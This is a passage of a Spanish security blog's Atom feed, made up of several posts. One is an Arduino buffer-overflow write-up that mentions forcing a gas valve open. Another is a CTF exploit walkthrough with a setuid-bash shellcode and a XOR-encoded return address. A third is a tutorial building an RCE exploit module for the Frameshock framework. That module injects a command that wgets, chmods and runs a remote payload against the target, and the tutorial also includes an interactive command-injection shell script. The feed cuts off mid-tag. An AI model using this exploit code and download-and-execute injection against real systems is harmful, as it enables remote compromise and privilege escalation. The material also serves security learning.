EXECUTABLE SPACE, por lo que todo lo demás que venia pegado al NewEIP era marcado con el byte non-exec y pasado por alto en el DATA SPACE.<br /><br />Por lo que nunca iba a poder lograr escalar privilegios a bootloader.</div><div style="text-align: center;"><h2>Conclución</h2></div><div style="text-align: center;"><b><br />Luego de entristecerme un tiempo una luz se encendió dentro mio...</b></div><div style="text-align: left;"><b><br /></b>No era posible ejecutar comandos dentro del DATA SPACE, pero era capaz de modificar el flujo de ejecución dentro del EXECUTABLE SPACE, por lo que era capaz de matar a un Arduino al dejar el EIP huerfano y además... era capas de llamar por medio del EIP y conociendo el memory address a cualquier otra función definida en el código ya que todos los saltos de memoria se encontrarían dentro del EXECUTABLE SPACE.<br /><br />Imaginemos que en nuestro sketch tenemos 2 funciones que habilitan o cierran la valvula de gas de un horno industrial y en base a una lectura de un sensor o un input Serial de algún tipo este valor decide que es mejor para el horno industrial si apagarse o arder.<br /><br /><br />void abrirGas(){ //Direccion de memoria 0xde04beff<br />&nbsp;&nbsp; //Abrir valvula de gas<br />}<br /><br />void cerrarGas(){ //Direccion de memoria 0xde12baff<br />&nbsp; //Cerrar valvula de gas<br />}<br /><br />Conociendo las posiciones de memoria de ambas funciones nosotros podriamos sobre escribir el EIP y lograr que el loop del Arduino siempre salte a la función <b>abrirGas() </b>lo que se reflejaría en una industria un probable incendio.<br /><br />En esta entrada no mostrare el PoC funcional sobre esto ya que el fin de esta entrada no es enseñar a romper sistemas embebidos sino demostrar que el <b>Internet of the Things</b> es un mundo increíble pero también abre un nuevo mundo para los ataques informáticos.<br /><br />Sin mas me despido pidiendo a todos los desarrolladores IoT que utilicen plataformas HARVARD que antes de publicar o vender un proyecto corroboren la correcta sanitización de las entradas analógicas y las entradas Seriales, ya que en un mundo donde todo se esta empezando a regir por sensores una falla nuestra como programadores puede costarle la vida a alguien, por lo menos en ambientes industriales.<br /><br />Les dejo el vídeo de como mato el proceso corriendo en Arduino explotando con éxito un Buffer Overflow en el sketch de esta publicación:</div><div style="text-align: left;"><div class="separator" style="clear: both; text-align: center;"><br /></div><div style="text-align: center;"><iframe allowfullscreen="" class="YOUTUBE-iframe-video" data-thumbnail-src="https://i.ytimg.com/vi/l02cX3TzTJw/0.jpg" frameborder="0" height="266" src="http://www.youtube.com/embed/l02cX3TzTJw?feature=player_embedded" width="320"></iframe></div></div><div style="text-align: center;"><br /></div><div style="text-align: left;"><br /></div><div style="text-align: left;">En el vídeo se muestra como al enviar 5 caracteres que son leidos por bufferIN, sobre escribo gracias a strcpy bufferOUT y logro pisar el EIP dejando huerfano el proceso por lo que el led rojo deja de parpadear.<br /><br />Espero que les haya parecido interesante esta investigación personal y despierte la curiosidad en todos los lectores!</div><div style="text-align: right;">Saludos!</div></div></div></div></div>]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Enfoqueseguro - Frameshock ]]></title>
    <link href="http://securitysignal.github.io/blog/2015/02/26/enfoqueseguro-frameshock/"/>
    <updated>2015-02-26T06:00:00-08:00</updated>
    <id>http://securitysignal.github.io/blog/2015/02/26/enfoqueseguro-frameshock</id>
    <content type="html"><![CDATA[<div class="separator" style="clear: both; text-align: center;"><a href="http://1.bp.blogspot.com/-GeJfQFRws4o/VO8jz1FQygI/AAAAAAAAAaQ/m5Pnt0y7Goc/s1600/logoenfoque.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://1.bp.blogspot.com/-GeJfQFRws4o/VO8jz1FQygI/AAAAAAAAAaQ/m5Pnt0y7Goc/s1600/logoenfoque.png" height="320" width="320" /></a></div><div style="text-align: left;"><div style="text-align: right;"><b>by hdbreaker</b> </div><br />Hoy, día de mi cumpleaños tuve el gusto de ser entrevistado por un miembro de este importante sitio de seguridad informática: <a href="http://www.enfoqueseguro.com/">www.enfoqueseguro.com</a><br /><a name='more'></a><br />El mismo se encuentra encabezado por <span class="_5yl5" data-reactid=".64.$mid=11424925504634=2171a43b2920a76aa78.2:0.0.0.0.0"><span data-reactid=".64.$mid=11424925504634=2171a43b2920a76aa78.2:0.0.0.0.0.0">Rafael Nuñez y trata toda diversidad de temas relacionados a la seguridad informatica en el mismo.<br /><br />En la entrevista se me realzaron a trasnoche varias preguntas sobre el desarrollo de Frameshock y su futuro.<br /><br />Quiero agradecer a mi gran amigo Q3rv0 que siempre ha estado para darme una mano y afrontar todo tipo de proyectos juntos y a todos los usuarios que apoyan el software libre, a todos aquellos que han reportado fallos, desarrollado módulos y colaborado de cualquier forma con la iniciativa de lograr una plataforma solida y robusta para el trabajo de un pentester.<br /><br />Recuerden el software libre es de todos, cualquiera lo puede usar y modificar, pero así mismo el mantenimiento del software libre es brindado por los mismos usuarios a todos aquellos que se hayan interesado en Frameshock les pedimos que nos ayuden a mejorarlo, desarrollando o detectando fallos!<br /><br />Entrevista:<br /><a href="http://www.enfoqueseguro.com/frameshock-desde-argentina-para-el-mundo/2015/02/26/">http://www.enfoqueseguro.com/frameshock-desde-argentina-para-el-mundo/2015/02/26/</a><br /><br />Respuesta actualizada sobre las dependencias básicas de Frameshock:</span></span>Las dependencias que de momentos requiere el núcleo de Frameshock son:</div><div style="text-align: left;"><br />[*] Tabulate</div><div style="text-align: left;">[*]<a href="https://www.blogger.com/null" name="cl-4"></a> colorama <a href="https://www.blogger.com/null" name="cl-5"></a>&nbsp;</div><div style="text-align: left;">[*] shodan <a href="https://www.blogger.com/null" name="cl-6"></a>&nbsp;</div><div style="text-align: left;">[*] html2text<br /><br />Demás esta decirle a todos los desarrolladores independientes de módulos que tienen la libertad de incluir cualquier dependencia que requieran siempre y cuando se realice un script de instalación de dependencias del mismo.</div>]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Level4 Pwned!]]></title>
    <link href="http://securitysignal.github.io/blog/2015/02/18/level4-pwned/"/>
    <updated>2015-02-18T14:30:00-08:00</updated>
    <id>http://securitysignal.github.io/blog/2015/02/18/level4-pwned</id>
    <content type="html"><![CDATA[<br /><div class="separator" style="clear: both; text-align: center;"><a href="http://i.imgur.com/DAy7Arn.jpg?1" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i.imgur.com/DAy7Arn.jpg?1" height="180" width="320" />&nbsp;</a></div><br /><div style="text-align: right;"><b>by [Q]3rV[0]</b></div><br />Últimamente le estuve dedicando tiempo al CTF de&nbsp;<a href="http://ringzer0team.com/">ringzer0team</a> que cuenta con una extensa lista de retos de todo tipo: <b>Exploiting, Informática forense, web,</b><br /><a name='more'></a><b> Cracking, Escalacion de privilegios en linux, Criptografia, Javascript,Inyecciones SQL</b>, etc.<br />&nbsp;Como consejo los invito a que se pasen por la web y le den masa a muchos de los desafíos que existen, ya que además de pasar un buen rato,&nbsp; se pueden llevar a casa unos buenos <b>skills</b> mejorados en el ámbito de la seguridad.<br /><br />El ultimo reto que realice tiene por nombre <b>"Level4 Pwnage Linux Level Up"</b>, esta dentro de una serie de desafíos de exploiting en linux en el que tendremos que ir rebalsando el vaso para ir ganando privilegios, comenzando por supuesto a partir del primer nivel.<br /><br /><br /><h2 style="text-align: center;">Level4 </h2><br />&nbsp;Una vez dentro, en el directorio <b>/levels</b> encontramos el binario level4 con su respectivo source, antes que nada vamos a ver como reacciona al pasaje de argumentos. Aclaro que <b>ASLR esta a 0</b> en el servidor y los binarios no presentan ninguna protección como <b>NX, CANARY</b>, etc.<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://1.bp.blogspot.com/-XS6aSzpbW_A/VOTjTGkensI/AAAAAAAAAYw/n4eEI0HBo20/s1600/1.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://1.bp.blogspot.com/-XS6aSzpbW_A/VOTjTGkensI/AAAAAAAAAYw/n4eEI0HBo20/s1600/1.png" /></a></div><div class="separator" style="clear: both; text-align: center;"></div><br /><br />Ok, ingreso una <b>A</b> como argumento y recibo una salida diferente tras cada ejecución, vamos a ver si podemos tocar el <b>EIP</b>.<br /><br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://3.bp.blogspot.com/-5iuIvh7Qj9Q/VOTkFc4aaFI/AAAAAAAAAY4/2NwPWgEqPEg/s1600/2.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://3.bp.blogspot.com/-5iuIvh7Qj9Q/VOTkFc4aaFI/AAAAAAAAAY4/2NwPWgEqPEg/s1600/2.png" /></a></div><br />Logramos sobrescribir <b>EIP</b>, pero aparentemente se pinta con un valor diferente a A, ahora si creo que es momento de pispear el source para ver que anda pasando.<br /><br /><br /><pre class="brush: c">/* <br /> This garbage has been written by Mr.Un1k0d3r 2014<br />*/<br /><br />#include &lt;stdlib.h&gt;<br />#include &lt;string.h&gt;<br />#include &lt;stdio.h&gt;<br />#include &lt;time.h&gt;<br /><br />#define BUFFER_MAX_SIZE 1024<br /><br />typedef struct __INPUT {<br /> char output[BUFFER_MAX_SIZE / 4];<br />} INPUT;<br /><br />void parse_buffer(char *buffer) {<br />    srand(time(NULL));<br />    char key = (unsigned char)(rand());<br />    int i, size = strlen(buffer);<br />    for(i = 0; i &lt; size; i++) {<br />        buffer[i] = (char)buffer[i] ^ key;<br />    }<br />}<br /><br />int main(int argc, char **argv) {<br />    INPUT input;<br />    char out[BUFFER_MAX_SIZE / 4];<br />    char in[BUFFER_MAX_SIZE];<br />    memset(out, 0, BUFFER_MAX_SIZE / 4);<br /><br />    if(argc != 2) {<br />        printf("Usage: %s buffer\n", argv[0]);<br />        exit(0);<br />    }<br /><br />    strncpy(in, argv[1], BUFFER_MAX_SIZE - 1);<br />    parse_buffer(in);<br /><br />    strncpy(out, in, BUFFER_MAX_SIZE - 1);<br />    strncpy(input.output, out, BUFFER_MAX_SIZE - 1);<br />    printf("output: %s\n", input.output);<br />    return 0;<br />}<br /><br /></pre><br />En esta función es donde se da el <b>truco</b>.<br /><br /><br /><pre class="brush: c">void parse_buffer(char *buffer) {<br />    srand(time(NULL));<br />    char key = (unsigned char)(rand());<br />    int i, size = strlen(buffer);<br />    for(i = 0; i &lt; size; i++) {<br />        buffer[i] = (char)buffer[i] ^ key;<br />    }<br />}<br /></pre><br />Lo que sucede es que cada carácter que es ingresado al buffer sufre una operación <b>XOR de su equivalente en ASCII</b>, pero&nbsp; como vemos la variable <b>key</b> almacena valores aleatorios mediante la función <b>rand()</b> por lo que en cada ejecución la cadena que le pasemos va a presentar un output diferente o no, si es que la key se vuelve a repetir.<br /><br />Analicemos un poco que es lo que hace el operador <b>^ </b>(XOR)<br /><br /><br /><h2 style="text-align: center;">XOR btwise&nbsp; </h2><div style="text-align: left;"><br /><b>XOR</b> es un operador que <b>trabaja a nivel de bits</b>, su función es simple, toma dos enteros y arroja una salida.</div><div style="text-align: left;"><br /></div><div style="text-align: left;">Supongamos que tenemos la siguiente linea.</div><div style="text-align: left;"><br /></div><div style="text-align: left;"><h3><b>26 ^ 30</b></h3></div><div style="text-align: left;"><br /></div><b>XOR</b> tomara ambos valores en binario y devolverá un 0 si ambos pares son iguales o 1 si son diferentes.<br /><br /><h3>26&nbsp;&nbsp; =&nbsp;&nbsp; 11010</h3><h3>30&nbsp;&nbsp; =&nbsp;&nbsp; 11110</h3><h3>out =&nbsp;&nbsp; 00100&nbsp; =&nbsp; 4 </h3><br />Entonces si realizo la siguiente operación<br /><br /><h3><b>4 ^ 30</b></h3><br />El resultado seria <b>26</b><br /><br />Comprendiendo ahora como trabaja <b>XOR</b> podemos codificar la dirección de memoria que sobrescribirá <b>EIP</b>, con un valor determinado y <b>esperar a que este se repita para que se produzca la decodificación</b>.<br /><br /><br /><br /><h2 style="text-align: center;">&nbsp;Forjando el exploit </h2><div class="separator" style="clear: both; text-align: center;"></div><br />En el server opte por almacenar el <b>NOPSLED+SHELLCODE</b> dentro de una variable de entorno y luego obtener la dirección en memoria de dicha variable con la que invadiremos el <b>EIP</b>.<br /><br /><br /><pre class="brush: bash">level4@rzt-bin01:~$ export SHELLCODE=$(python -c 'print "\x90"*200+"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"')<br /></pre><br />La ubicación de <b>SHELLCODE</b> podemos divisarla con el siguiente programita en c.<br /><br /><br /><pre class="brush: c">#include &lt;stdlib.h&gt;<br /><br />int main()<br />{<br />    char *addr;<br />    addr = getenv("SHELLCODE");<br />    printf("SHELLCODE is at %p\n", addr);<br />    exit(0);<br />}<br /><br /></pre><br /><br /><pre class="brush: bash">level4@rzt-bin01:~$ /var/tmp/./findvar<br />SHELLCODE is at 0xbffff876<br /></pre><br />Una vez que obtenemos la dirección la codificamos a&nbsp; <b>XOR ^ 47 </b><br /><br /><br />Para no tener que andar codeando nada nuevo,&nbsp; simplemente aproveche el source del binario y le deje el valor de la variable <b>key</b> fijo en <b>47</b>, que es el entero que usaremos para codificar nuestra dirección y con suerte esperemos que se repita enseguida.<br /><br /><br /><pre class="brush: c">/* <br /> This garbage has been written by Mr.Un1k0d3r 2014<br />*/<br /><br />#include &lt;stdlib.h&gt;<br />#include &lt;string.h&gt;<br />#include &lt;stdio.h&gt;<br />#include &lt;time.h&gt;<br /><br />#define BUFFER_MAX_SIZE 1024<br /><br />typedef struct __INPUT {<br /> char output[BUFFER_MAX_SIZE / 4];<br />} INPUT;<br /><br />void parse_buffer(char *buffer) {<br />    char key = (unsigned char)(47);<br />    int i, size = strlen(buffer);<br />    for(i = 0; i &lt; size; i++) {<br />        buffer[i] = (char)buffer[i] ^ key;<br />    }<br />}<br /><br />int main(int argc, char **argv) {<br />    INPUT input;<br />    char out[BUFFER_MAX_SIZE / 4];<br />    char in[BUFFER_MAX_SIZE];<br />    memset(out, 0, BUFFER_MAX_SIZE / 4);<br /><br />    if(argc != 2) {<br />        printf("Usage: %s buffer\n", argv[0]);<br />        exit(0);<br />    }<br /><br />    strncpy(in, argv[1], BUFFER_MAX_SIZE - 1);<br />    parse_buffer(in);<br /><br />    strncpy(out, in, BUFFER_MAX_SIZE - 1);<br />    strncpy(input.output, out, BUFFER_MAX_SIZE - 1);<br />    printf("output: %s\n", input.output);<br />    return 0;<br />}<br /><br /></pre><br /><br />Lo compilamos en local<br /><br /><br /><pre class="brush: bash">gcc -o xorencode -fno-stack-protector -mpreferred-stack-boundary=2 level4xor.c<br /></pre><br /><br />Y codificamos <b>0xbffff876</b><br /><br /><br /><div class="separator" style="clear: both; text-align: center;"><b><a href="http://4.bp.blogspot.com/-W06JZt8Allo/VOUA6XnHEDI/AAAAAAAAAZY/IhLUzN4FZak/s1600/4.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://4.bp.blogspot.com/-W06JZt8Allo/VOUA6XnHEDI/AAAAAAAAAZY/IhLUzN4FZak/s1600/4.png" /></a></b></div><br /><br />Por lógica si volviéramos a codificar <b>0x59d7d090</b> el valor tendría que ser igual a <b>0xbffff876</b>.<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://4.bp.blogspot.com/-4tXD71t62G8/VOUFBXhq4mI/AAAAAAAAAZk/YIfbtbK0ewU/s1600/5.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://4.bp.blogspot.com/-4tXD71t62G8/VOUFBXhq4mI/AAAAAAAAAZk/YIfbtbK0ewU/s1600/5.png" /></a></div><br />Solo resta armar el exploit y darle a mano hasta que la key obtenga el valor <b>47</b> cosa que no es imposible pero puede llevarnos algún tiempito o no, <b>dependera de la suerte con la que corramos!</b>.<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://1.bp.blogspot.com/-DX2yvpUjb6g/VOUGRHy7jZI/AAAAAAAAAZs/xEYaRrg1eNs/s1600/6.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://1.bp.blogspot.com/-DX2yvpUjb6g/VOUGRHy7jZI/AAAAAAAAAZs/xEYaRrg1eNs/s1600/6.png" /></a></div><br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://4.bp.blogspot.com/-AKA7dfPcUQ8/VOUJiwhBLaI/AAAAAAAAAaA/b_1571kmq1Q/s1600/15302056.jpg" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://4.bp.blogspot.com/-AKA7dfPcUQ8/VOUJiwhBLaI/AAAAAAAAAaA/b_1571kmq1Q/s1600/15302056.jpg" /></a></div><br /><h2 style="text-align: center;">Dos dias despues...</h2><div style="text-align: left;"><br /></div><div style="text-align: left;">No, es joda! XD, luego de media hora intentando el exploit termino por tirarme el prompt de la victoria, el <b>EIP</b> por fin se tiño con la dirección donde se hallaba nuestro <b>shellcode</b> y pude tomar el <b>setuid</b> de level5!.</div><div style="text-align: left;"><br /></div><div class="separator" style="clear: both; text-align: center;"><a href="http://3.bp.blogspot.com/-aqko-TEkmP0/VOUHmKboBUI/AAAAAAAAAZ0/3vwX70zGK8c/s1600/7.jpg" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://3.bp.blogspot.com/-aqko-TEkmP0/VOUHmKboBUI/AAAAAAAAAZ0/3vwX70zGK8c/s1600/7.jpg" /></a></div><div style="text-align: left;"><br /></div><div style="text-align: left;"><br /></div><div style="text-align: left;">Y se preguntaran por que no programe un script que me automatice el trabajo??...<b>sangre sudor y gloria es mi respuesta</b>.</div><div style="text-align: left;"><br /></div><div style="text-align: left;"><br /></div>]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Programa tu modulo para Frameshock]]></title>
    <link href="http://securitysignal.github.io/blog/2015/02/07/programa-tu-modulo-para-frameshock/"/>
    <updated>2015-02-07T12:44:00-08:00</updated>
    <id>http://securitysignal.github.io/blog/2015/02/07/programa-tu-modulo-para-frameshock</id>
    <content type="html"><![CDATA[<div style="text-align: right;"><div class="separator" style="clear: both; text-align: center;"></div><div class="separator" style="clear: both; text-align: center;"><a href="http://i.imgur.com/8KCwaUh.jpg?3" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://i.imgur.com/8KCwaUh.jpg?3" height="250" width="400" /></a></div><div style="text-align: center;"><br /></div><br /><b>&nbsp;by [Q]3rV[0]</b></div><div style="text-align: right;"><br /></div>Recientemente y de la mano de mi amigo<b> hdbreaker</b> salio a la luz un nuevo framework de explotacion llamado <b>Frameshock</b>, el cual promete ser una<br /><a name='more'></a>herramienta que a futuro, llegue a competir con el imponente <b>Metasploit</b>. Lo mejor de esta tool es que esta basada completamente en python y el desarrollo de exploits, auxiliares, etc se hace tremendamente sencillo debido a la manera en que trata los modulos.<br /><br />En fin, basta de chicharas y vamos a evocarnos a lo que el titulo llama. Antes de proseguir con el resto del tutorial, se tiene en cuenta que el lector cuenta con conocimientos de POO en el lenguaje python.<br /><br /><b>*** ADVERTENCIA ***</b> Si estas leyendo esto y todavía no te encontras  familiarizado con el framework, podes ver el siguiente <a href="http://www.securitysignal.tk/2015/02/frameshock-al-descubierto.html">enlace</a><br /><br /><h2 style="text-align: center;">Estructura de los módulos </h2><h3 style="text-align: left;"></h3><span style="font-weight: normal;">La estructura de los módulos es la siguiente, y lo único a respetar durante el desarrollo.</span><br /><br /><pre class="brush: py"># -*- coding : utf-8 -*-<br />import sys<br />sys.path.append('.')<br />from config import config<br />from tabulate import tabulate<br /><br />class module(config):<br /><br />    def __init__(self):<br />        self.config=config()<br />        self.cur = self.config.getCursor()<br />        self.con = self.config.getCon()<br />        self.targets=[]<br />        self.preExecution()<br /><br />    def preExecution(self):<br />        while 1:<br />            ################Aca se definen las opciones y se cargan los argumentos################<br /><br /><br /><br />    def exploit(self):<br />        if len(self.targets)&gt;0:<br />            for target in self.targets:<br />                print "Attack "+target[1]<br />                ################Aca va el exploit################<br />        else:<br />            print "No hay targets"<br /><br />################Aca va el metodo que contiene el exploit################<br />    def test(self):<br />        print "Attack Test"<br />########################################################################<br /><br />##########Se inicia el modulo###########<br />start=module()<br />########################################<br /></pre><br />Como se ve:<br /><br /><ul><li>Se importan módulos necesarios como <b>sys</b> para agregar el dir base al PATH de python: <b>sys.path.append('.')</b></li></ul><ul><li>Se importa el modulo <b>config</b> el cual contiene ciertos métodos que nos proveerán de los datos que configuramos con la opción <b>config en el prompt de frameshock</b>. Además es necesario para trabajar con <b>shodan y la db</b> si es que lo necesitamos.</li></ul><ul><li>Se importa <b>tabulate</b>, el cual lo usaremos para mostrar informacion en forma de tabla como por ejemplo los targets seteados.</li></ul><br /><h2 style="text-align: center;">La clase module()</h2><h3 style="text-align: center;">&nbsp;</h3><div style="text-align: left;">La clase module contiene tres métodos,<b> </b>en<b> __init__</b>:</div><ul><li>Se inicializa el objeto <b>config</b> y se llama a dos métodos dentro de <b>config</b></li></ul><ul><li><b>getCursor()</b></li><li><b>getCon()</b></li></ul><div style="text-align: left;"><br />Necesarios para trabajar con la db <b>sqlite3</b>, como dije anteriormente nos servirán para hacer uso de <b>shodan</b>, pero en este apartado no se hará referencia al mismo, aunque de igual manera se mencionaran.</div><ul><li>Se crea una lista vacía <b>self.targets=[]</b> que almacenara los objetivos que seleccionemos en modo manual.</li></ul><ul><li>Por ultimo se llama al método <b>preExecution.</b></li></ul><br /><div style="text-align: center;"><h2><b>preExecution()</b></h2></div><ul></ul><br />Acá indicaremos la opciones que contendrá el modulo y cargaremos los argumentos que son pasados a través de esas opciones, tales como el target objetivo, la opción de arranque del modulo, etc. Eso va en los parámetros que necesite recibir nuestro modulo, si desean también pueden incluir una opción para desplegar información acerca del mismo, o datos del autor.<br />&nbsp;Comencemos! y a partir de acá, siéntanse libres de codear a su antojo, para nuestro ejemplo voy a portar como modulo de Frameshock un simple script que explota un rce.<br /><br /><div style="text-align: left;"></div><pre class="brush: py">#!/usr/bin/python<br /><br />import urllib2<br />import sys<br /><br />def rce(target):<br />    while 1:<br />        command=raw_input("$&gt; ")<br />        w=urllib2.urlopen(target+"www.google.com|"+command)<br />        print w.read()<br /><br />rce(sys.argv[1])<br /></pre><br /><div style="text-align: center;"><h3><b>let's go!</b></h3></div><br />Arranquemos por definir la opción <b>help</b>. Por comodidad respecto a la sintaxis se optara por utilizar la misma que msf, pero no es algo indispensable.<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://4.bp.blogspot.com/-Fy3uRAxgfLM/VNZuP8UKYxI/AAAAAAAAAXM/SfkPBSL21tA/s1600/pre1.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://4.bp.blogspot.com/-Fy3uRAxgfLM/VNZuP8UKYxI/AAAAAAAAAXM/SfkPBSL21tA/s1600/pre1.png" height="174" width="640" /></a></div><br /><br />Ahora continuemos con el resto de las opciones necesarias para nuestro modulo.<br /><br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://1.bp.blogspot.com/-BUIJ0Wy-xrA/VNZuu5tMZVI/AAAAAAAAAXU/zy1ca5_c_TU/s1600/preexecu2.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://1.bp.blogspot.com/-BUIJ0Wy-xrA/VNZuu5tMZVI/AAAAAAAAAXU/zy1ca5_c_TU/s1600/preexecu2.png" height="412" width="640" /></a></div><br /><br />Sencillo no?, no hace falta explicar mucho, el código habla por si solo.<br /><br />Para obtener el objetivo, hacemos un split a la cadena <b>set target</b>, tomamos el indice 2 y luego hacemos un append para ingresar los datos dentro de <b>self.targets</b>.<br />&nbsp; <br />Para desplegar los objetivos lo hacemos con tabulate, por cuestiones de estetica, lo dije antes y lo vuelvo a decir, <b>SIÉNTANSE LIBRES!</b><br /><br />Si la opción elegida es <b>exploit</b> invoca el metodo <b>exploit()</b> que lo trataremos en el siguiente paso.<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <br /><h2 style="text-align: center;">exploit()</h2><h2 style="text-align: center;"></h2><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://4.bp.blogspot.com/-3WSHvxRJY1I/VNVTUFvGHPI/AAAAAAAAAWU/cg3LMPn1JwY/s1600/no_me_digas_by_rober_raik-d4dt7n7.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://4.bp.blogspot.com/-3WSHvxRJY1I/VNVTUFvGHPI/AAAAAAAAAWU/cg3LMPn1JwY/s1600/no_me_digas_by_rober_raik-d4dt7n7.png" height="532" width="640" /></a></div><br /><div style="text-align: left;">Tenemos dos caminos, utilizar algún <b>payload provisto por Frameshock</b>, o bien realizar una conexión directa.<br /><br />Como el <b>handler</b> del framework no esta el divino botón optaremos por la primera.<br /><br />Definiremos el método que contendrá el exploit e importaremos las librerias necesarias. </div><div style="text-align: left;"><br /></div><pre class="brush: py">def rce(self, target):<br />        command="wget%20http://"+self.config.getUrlInjector()+"%20-O%20"+self.config.getInjectorName()+"%3Bchmod%20755%20"+self.config.getInjectorName()+"%3Bpython%20"+self.config.getInjectorName()<br />        urllib2.urlopen(target+"www.google.com%7C"+command) </pre><br />Hagamos un párate y pongamos un par de cosas en remojo.<br /><br /><ul><li><b>self.config.getUrlInjector()</b> : Retorna la url del payload que hemos seteado desde frameshock</li></ul><ul><li><b>self.config.getInjectorName()</b> : Nos devolverá el nombre del payload elegido.</li></ul><br />Entonces el metodo rce() lo único que hace es descargar nuestro payload en el servidor remoto, darle permisos de ejecución y <b>lanzarlo contra nuestro handler</b>.<br /><br /><br /><pre class="brush: py">command="wget http://"+self.config.getUrlInjector()+" -O "+self.config.getInjectorName()+";chmod 755 "+self.config.getInjectorName()+";python "+self.config.getInjectorName()<br /></pre><br />Lo llamamos desde <b>exploit()</b> y nos disponemos a probar nuestro modulo, quedando de la siguiente manera.<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://3.bp.blogspot.com/-JZs3v7Bivto/VNaxNBtZXzI/AAAAAAAAAYA/E-3bTc_yDgM/s1600/exploitcall.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://3.bp.blogspot.com/-JZs3v7Bivto/VNaxNBtZXzI/AAAAAAAAAYA/E-3bTc_yDgM/s1600/exploitcall.png" height="152" width="640" /></a></div><br /><br /><br /><pre class="brush: py"># -*- coding : utf-8 -*-<br />import sys<br />sys.path.append('.')<br />from config import config<br />from tabulate import tabulate<br />import urllib2<br /><br />class module(config):<br /><br />    def __init__(self):<br />        self.config=config()<br />        self.cur = self.config.getCursor()<br />        self.con = self.config.getCon()<br />        self.targets=[]<br />        self.preExecution()<br /><br />    def preExecution(self):<br />        while 1:<br />            ################Aca se definen las opciones y se cargan los argumentos################<br />            opcion=raw_input("&gt; ")<br /><br />            if opcion=="help":<br />                print("set target &lt;TARGET&gt; -&gt; Setea el target manualmente")<br />                print("exit -&gt; Cierra el modulo")<br />                print("show targets -&gt; Muestra los targets seteados")<br />                print("clear targets -&gt; Elimina los targets")<br />                print("exploit -&gt; Inicia el modulo de ataque")<br /><br />            elif opcion.find("set target")!=-1:<br />                target=opcion.split(' ')[2]<br />                self.targets.append((0, target, "Modulo para explotar un RCE", "RCE"))<br /><br />            elif opcion=="exit":<br />                exit(0)<br /><br />            elif opcion=="show targets":<br />                if len(self.targets)&gt;0:<br />                    print tabulate(self.targets, ["ID", "TARGET", "DESCRIPCION", "MODULO"], tablefmt="grid")<br />                else:<br />                    print "No hay targets seteados"<br /><br />            elif opcion=="clear targets":<br />                self.targets=[]<br /><br />            elif opcion=="exploit":<br />                self.exploit()<br /><br /><br />    def exploit(self):<br />        if len(self.targets)&gt;0:<br />            for target in self.targets:<br />                print "Attack "+target[1]<br />                ################Aca va el exploit################<br />                self.rce(target[1])<br />        else:<br />            print "No hay targets"<br /><br />################Aca va el metodo que contiene el exploit################<br />    def rce(self, target):<br />        command="wget%20http://"+self.config.getUrlInjector()+"%20-O%20"+self.config.getInjectorName()+"%3Bchmod%20755%20"+self.config.getInjectorName()+"%3Bpython%20"+self.config.getInjectorName()<br />        urllib2.urlopen(target+"www.google.com%7C"+command)<br />########################################################################<br /><br />##########Se inicia el modulo###########<br />start=module()<br />########################################<br /><br /></pre>Antes que nada, lo guardaremos en el directorio <b>/FrameShock/Modules</b> respetando la regla del nombre.<br /><br /><b>numero_nombremodulo.py</b><br /><br />Por ejemplo:<b> </b><br /><br />Si tenemos los siguiente módulos (<b>1_moduloprueba.py, 2_moduloprueba.py, 3_moduloprueba.py</b>), Lo agregaremos como <b>4_rce.py</b>.<br /><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://4.bp.blogspot.com/-iKle3OWpmxg/VNVggASqhBI/AAAAAAAAAWs/-ibGmZZz7rE/s1600/15127416.jpg" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://4.bp.blogspot.com/-iKle3OWpmxg/VNVggASqhBI/AAAAAAAAAWs/-ibGmZZz7rE/s1600/15127416.jpg" height="640" width="640" /></a></div><div class="separator" style="clear: both; text-align: center;"></div><div class="separator" style="clear: both; text-align: center;"></div><br /><div style="text-align: center;">Estamos listos para cargar nuestro modulo de prueba.</div><br /><div class="separator" style="clear: both; text-align: center;"><a 